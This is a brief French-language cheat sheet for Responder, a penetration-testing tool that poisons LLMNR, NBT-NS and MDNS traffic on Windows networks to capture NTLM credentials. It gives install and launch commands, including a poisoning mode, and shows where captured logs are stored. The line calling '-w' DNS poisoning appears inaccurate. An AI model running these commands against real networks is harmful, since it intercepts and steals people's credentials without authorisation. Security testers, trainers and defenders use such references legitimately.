# Responder - Résumé et utilisation

## Présentation
Responder est un outil utilisé pour intercepter les requêtes réseau Windows (LLMNR, NBT-NS, MDNS) 
et capturer des identifiants NTLM pour les exploiter.

## Installation
# Kali Linux : préinstallé
sudo apt update && sudo apt install responder -y

## Utilisation de base
# Lancer Responder sur une interface (ex: eth0)
sudo responder -I eth0

# Mode analyse (observe sans interagir)
sudo responder -I eth0 -A

# Mode capture avec empoisonnement DNS activé
sudo responder -I eth0 -w On

## Vérification des logs
ls /usr/share/responder/logs/
cat /usr/share/responder/logs/Responder-Session.log

